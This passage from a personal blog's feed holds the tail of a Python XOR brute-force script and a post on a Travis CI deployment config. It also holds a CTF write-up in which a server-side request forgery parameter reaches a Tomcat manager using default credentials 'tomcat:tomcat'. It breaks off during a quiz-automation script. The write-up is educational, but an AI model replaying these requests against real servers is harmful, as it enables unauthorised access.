        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
            &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
            &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;
                &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
            &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;brute&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="security"></category><category term="cryptography"></category><category term="code review"></category></entry><entry><title>Building this blog with travis</title><link href="https://matthieukeller.com/2017/03/building-this-blog-with-travis.html" rel="alternate"></link><published>2017-03-04T09:30:00+01:00</published><updated>2017-03-04T09:30:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2017-03-04:/2017/03/building-this-blog-with-travis.html</id><summary type="html">&lt;p&gt;Since January this blog is automatically build using &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;. The
main advantage is to always use the latest version of &lt;a href="https://blog.getpelican.com/"&gt;Pelican&lt;/a&gt; as
&lt;a href="https://travis-ci.org/"&gt;travis CI&lt;/a&gt; always build its environment from scratch. An other
advantage is that I am able to update the site just from my browser for minor
modifications (spell correction for instance).&lt;/p&gt;
</summary><content type="html">&lt;p&gt;Since January this blog is automatically build using &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;. The
main advantage is to always use the latest version of &lt;a href="https://blog.getpelican.com/"&gt;Pelican&lt;/a&gt; as
&lt;a href="https://travis-ci.org/"&gt;travis CI&lt;/a&gt; always build its environment from scratch. An other
advantage is that I am able to update the site just from my browser for minor
modifications (spell correction for instance).&lt;/p&gt;


&lt;p&gt;Here is the &lt;code&gt;travis.yml&lt;/code&gt; configuration file pass to &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;language: python

install:
  # https://github.com/wummel/linkchecker/issues/649
  - pip install requests==2.9.1
  - pip install LinkChecker==9.3
  - pip install pelican markdown

  # grab the build theme
  - git clone -b build https://github.com/maggick/maggner-pelican

  # grab the pelican plugins
  - git clone https://github.com/getpelican/pelican-plugins

  # grab the latest published version in order to not erase rss feed
  - git clone https://github.com/maggick/maggick.github.io output

script:
  - linkchecker --check-extern ./content
  - pelican

after_success:
  - cd output
  - git add ./
  - git -c user.name=&amp;quot;Travis CI for maggick&amp;quot; -c user.email=&amp;quot;keller.mdp@gmail.com&amp;quot; commit -m &amp;#39;Travis update documentation&amp;#39;
  - git push https://${GH_TOKEN}@github.com/maggick/maggick.github.io.git master
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Declaration&lt;/h2&gt;
&lt;p&gt;Let us break it a bit. First the declaration part:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We do not need the root right so &lt;code&gt;sudo&lt;/code&gt; is not needed. Moreover we use the
python language.&lt;/p&gt;
&lt;h2&gt;install&lt;/h2&gt;
&lt;p&gt;The installation part:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;install:
  # https://github.com/wummel/linkchecker/issues/649
  - pip install requests==2.9.1
  - pip install LinkChecker==9.3
  - pip install pelican markdown

  # grab the build theme
  - git clone -b build https://github.com/maggick/maggner-pelican

  # grab the pelican plugins
  - git clone https://github.com/getpelican/pelican-plugins

  # grab the latest published version in order to not erase rss feed
  - git clone https://github.com/maggick/maggick.github.io output
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We install:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.python-requests.org/en/master/"&gt;request&lt;/a&gt; in version 2.9.1, this is a python library used by pelican&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/LinkChecker"&gt;LinkChecker&lt;/a&gt; in version 9.3, this is a tool that will check
   that the link in the different articles give a 200 HTTPÂ response&lt;/li&gt;
&lt;li&gt;&lt;a href="http://getpelican.com/"&gt;pelican&lt;/a&gt; which is used to build the site&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/Markdown"&gt;mardkown&lt;/a&gt; because the articles are wrote in markdown&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Then we grab the theme used by the site on the build branch directly on
&lt;a href="https://github.com/maggick/maggner-pelican"&gt;github&lt;/a&gt;, we also download the &lt;a href="https://github.com/getpelican/pelican-plugins"&gt;pelican plugins&lt;/a&gt;.
We need to get the last build of the site in order to not re publish all the
articles in the RSS feed (it happened once when writing this configuration).&lt;/p&gt;
&lt;h2&gt;Script&lt;/h2&gt;
&lt;p&gt;The script part is where the magic happen, this part will build the site and
give a red or green status depending of the output of each script. If all of
them exit without error the build is green otherwise the build is red.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;script:
  - linkchecker --check-extern ./content
  - pelican
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The script part used &lt;a href="https://pypi.python.org/pypi/LinkChecker"&gt;LinkChecker&lt;/a&gt; on the content directory where
are all articles in the markdown format. This script will test every link on
every file and exit with an error if a link return something else that an HTTP
200 OK.&lt;/p&gt;
&lt;p&gt;Then we use &lt;a href="http://getpelican.com/"&gt;pelican&lt;/a&gt; to build the site. If an error happened during
the build the script will also exit with an error.&lt;/p&gt;
&lt;h2&gt;After success&lt;/h2&gt;
&lt;p&gt;Finally, after the success of the two script we deploy the site on github pages,
we publish the site on &lt;a href="https://pages.github.com/"&gt;github pages&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;after_success:
  - cd output
  - git add ./
  - git -c user.name=&amp;quot;Travis CI for maggick&amp;quot; -c user.email=&amp;quot;keller.mdp@gmail.com&amp;quot; commit -m &amp;#39;Travis update documentation&amp;#39;
  - git push https://&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;GH_TOKEN&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;@github.com/maggick/maggick.github.io.git master
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We go in the &lt;code&gt;output&lt;/code&gt; directory of the build, we add everything for git, we
commit everything using a user crafted for the occasion and my public email
address. The commit message is a generic one. Then we push everything on the
branch &lt;code&gt;master&lt;/code&gt; of the &lt;a href="https://pages.github.com/"&gt;github pages&lt;/a&gt; repository.&lt;/p&gt;
&lt;p&gt;For this last step I was forced to give a write access to all my repositories to
&lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt; using the &lt;a href="https://github.com"&gt;github&lt;/a&gt; API. I do not really like
that but as I am monitoring the commit on my own repository I should be able to
detect a hack  or a malicious action of &lt;a href="https://travis-ci.org/"&gt;Travis CI&lt;/a&gt;. The next
step will be to sign all my commit using GPG but I have not find a suitable
solution yet (mostly for commit from browser).&lt;/p&gt;</content><category term="programming"></category><category term="devops"></category></entry><entry><title>Insomnihack Teaser 2017</title><link href="https://matthieukeller.com/2017/01/insomnihack-teaser-2017.html" rel="alternate"></link><published>2017-01-22T22:00:00+01:00</published><updated>2017-01-22T22:00:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2017-01-22:/2017/01/insomnihack-teaser-2017.html</id><summary type="html">&lt;p&gt;This week-end was the insomnihack teaser CTF. I participated with the team
&lt;strong&gt;The Half Crunchy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The theme was "RISE OF THE MACHINES" with rogue webserver and flawing cat robot.&lt;/p&gt;
&lt;p&gt;We finished 42th with 550 points flagging 5 challenges:&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;img alt="scoreboard" src="/media/2017.01/scoreboard.png"&gt;&lt;/p&gt;
&lt;p&gt;Many thanks to the organisation! It was a really nice CTF.&lt;/p&gt;
&lt;p&gt;Thanks to all team members who participated.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;This week-end was the insomnihack teaser CTF. I participated with the team
&lt;strong&gt;The Half Crunchy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The theme was "RISE OF THE MACHINES" with rogue webserver and flawing cat robot.&lt;/p&gt;
&lt;p&gt;We finished 42th with 550 points flagging 5 challenges:&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;img alt="scoreboard" src="/media/2017.01/scoreboard.png"&gt;&lt;/p&gt;
&lt;p&gt;Many thanks to the organisation! It was a really nice CTF.&lt;/p&gt;
&lt;p&gt;Thanks to all team members who participated.&lt;/p&gt;


&lt;h2&gt;Smarttomcat&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart
tomcat robot.&lt;/p&gt;
&lt;p&gt;Now the damn thing has attacked me and flew away. I can't even seem to track it
down on the broken search interface... Can you help me ?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The web site let you enter coordinate where you may think the cat is.&lt;/p&gt;
&lt;p&gt;&lt;img alt="smarttomact screenshot" src="/media/2017.01/site.png"&gt;&lt;/p&gt;
&lt;p&gt;When intercepting the traffic with Burp we see that the request look like the
following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;smarttomcat.teaser.insomnihack.ch&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;en-US,en;q=0.5&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://smarttomcat.teaser.insomnihack.ch/&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;61&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

u=http%3A%2F%2Flocalhost%3A8080%2Findex.jsp%3Fx%3D42%26y%3D42
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We notice the &lt;code&gt;u&lt;/code&gt; parameter which decoded is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;8080&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;index&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;jsp&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nt"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;42&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;42&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The server is using itself as a proxy, When modifying the request with a &lt;code&gt;lol&lt;/code&gt;,
the &lt;code&gt;u&lt;/code&gt; parameter is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;u=http%3A%2F%2Flocalhost%3A8080%2Flol
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The server response is an error which indicate us that the server is using a
tomcat server 7.0.68.&lt;/p&gt;
&lt;p&gt;&lt;img alt="testing a bad request" src="/media/2017.01/lol.png"&gt;&lt;/p&gt;
&lt;p&gt;We learned that this is a tomcat server, so let's see if we can get the manager:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;u=http%3A%2F%2Flocalhost%3A8080%2Fmanager/html/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="authentication error on tomcat manager" src="/media/2017.01/manager.png"&gt;&lt;/p&gt;
&lt;p&gt;Tomcat manager used a HTTP basic auth, and we can authenticate with a URL looking
like &lt;code&gt;http://username:password@site.com&lt;/code&gt; so with the following parameter we test
the default user and password for tomcat manager:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;u=http%3A%2F%2Ftomcat:tomcat@localhost%3A8080%2Fmanager/html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The response is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;We won&amp;#39;t give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Cryptquizz&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello, young hacker. Are you ready to fight rogue machines ? Now, you'll have to
prove us that you are a genuine cryptographer.&lt;/p&gt;
&lt;p&gt;Running on quizz.teaser.insomnihack.ch:1031&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This challenge is a series of questions regarding year of birth of different
cryptographers.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@eridani ~]$ nc quizz.teaser.insomnihack.ch 1031

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~ Hello, young hacker. Are you ready to fight rogue machines ?    ~~
~~ Now, you&amp;#39;ll have to prove us that you are a genuine             ~~
~~ cryptographer.                                                  ~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~ What is the birth year of Ronald Cramer ?
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In order to obtain the flag it is necessary to automated the process. This is
quit simple in python but a bit repetitive.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pexpect&lt;/span&gt;

&lt;span class="n"&gt;child&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pexpect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;telnet quizz.teaser.insomnihack.ch 1031&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;question&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expect&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Alan Turing&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Amit Sahai&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bruce &lt;/span&gt;
&lt;span class="n"&gt;Schneier&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Claude&lt;/span&gt; &lt;span class="n"&gt;Shannon&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Claus&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Peter&lt;/span&gt; &lt;span class="n"&gt;Schnorr&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Dan&lt;/span&gt; &lt;span class="n"&gt;Boneh&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Daniel&lt;/span&gt; 
&lt;span class="n"&gt;Bleichenbacher&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Daniel&lt;/span&gt; &lt;span class="n"&gt;J&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Bernstein&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;David&lt;/span&gt; &lt;span class="n"&gt;Chaum&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Donald&lt;/span&gt; &lt;span class="n"&gt;Davies&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Don&lt;/span&gt; 
&lt;span class="n"&gt;Coppersmith&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Douglas&lt;/span&gt; &lt;span class="n"&gt;Stinson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Eli&lt;/span&gt; &lt;span class="n"&gt;Biham&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Gilles&lt;/span&gt; &lt;span class="n"&gt;Brassard&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Horst&lt;/span&gt; 
&lt;span class="n"&gt;Feistel&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ivan&lt;/span&gt; &lt;span class="n"&gt;Damgard&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Jacques&lt;/span&gt; &lt;span class="n"&gt;Stern&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Jean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Jacques&lt;/span&gt; &lt;span class="n"&gt;Quisquater&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Jim&lt;/span&gt; 
&lt;span class="n"&gt;Massey&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Joan&lt;/span&gt; &lt;span class="n"&gt;Daemen&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Markus&lt;/span&gt; &lt;span class="n"&gt;Jakobsson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Martin&lt;/span&gt; &lt;span class="n"&gt;Hellman&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Michael&lt;/span&gt; &lt;span class="n"&gt;O&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; 
&lt;span class="n"&gt;Rabin&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Mihir&lt;/span&gt; &lt;span class="n"&gt;Bellare&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Mitsuru&lt;/span&gt; &lt;span class="n"&gt;Matsui&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Moni&lt;/span&gt; &lt;span class="n"&gt;Naor&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Neal&lt;/span&gt; 
&lt;span class="n"&gt;Koblitz&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Niels&lt;/span&gt; &lt;span class="n"&gt;Ferguson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Nigel&lt;/span&gt; &lt;span class="n"&gt;P&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Smart&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Paul&lt;/span&gt; &lt;span class="n"&gt;Kocher&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Paulo&lt;/span&gt; 
&lt;span class="n"&gt;Barreto&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Rafail&lt;/span&gt; &lt;span class="n"&gt;Ostrovsky&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ralph&lt;/span&gt; &lt;span class="n"&gt;Merkle&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ronald&lt;/span&gt; &lt;span class="n"&gt;Cramer&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ron&lt;/span&gt; 
&lt;span class="n"&gt;Rivest&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Ross&lt;/span&gt; &lt;span class="n"&gt;Anderson&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Scott&lt;/span&gt; &lt;span class="n"&gt;Vanstone&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Serge&lt;/span&gt; &lt;span class="n"&gt;Vaudenay&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;Shafi&lt;/span&gt; 
